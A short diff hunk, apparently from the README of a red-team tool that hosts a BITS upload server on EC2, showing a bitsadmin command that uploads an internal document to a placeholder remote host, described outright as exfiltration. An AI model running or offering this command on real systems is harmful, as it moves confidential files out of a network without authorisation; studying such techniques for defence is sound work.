@@ -17,4 +17,5 @@ Host the server on the EC2 instance with command like <python simplebitsServer.p
 
 
 bitsadmin /setproxysettings Job PRECONFIG
+
 Bitsadmin /Transfer JOB /PRIORITY HIGH /UPLOAD hxxp://<remoteIP/URL>:<port> C:\User\<path to internal document to exfiltrate>
